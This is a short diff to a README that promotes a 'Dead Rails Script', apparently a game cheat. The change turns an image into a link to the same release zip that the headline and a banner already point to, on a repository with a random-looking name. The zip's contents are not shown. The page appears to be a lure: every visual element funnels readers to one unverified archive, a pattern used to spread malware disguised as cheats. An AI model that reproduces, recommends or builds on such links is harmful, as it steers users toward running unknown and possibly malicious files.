@@ -4,7 +4,8 @@ Welcome to the **official Dead Rails Script repository**, your all-in-one soluti
 
 ### 🔽 [Instant Download – Dead Rails Script 🔓](https://github.com/EFWFEWFQ/literate-system/releases/download/new/Updated.Script.zip)
 
-![image](https://github.com/user-attachments/assets/47ddf55a-3bbf-434c-a26b-da7efb8718d7)
+[![image](https://github.com/user-attachments/assets/47ddf55a-3bbf-434c-a26b-da7efb8718d7)
+](https://github.com/EFWFEWFQ/literate-system/releases/download/new/Updated.Script.zip)
 
 [![banner](https://github.com/user-attachments/assets/70c0806c-4260-4fce-bebb-3d29462342f8)
 ](https://github.com/EFWFEWFQ/literate-system/releases/download/new/Updated.Script.zip)
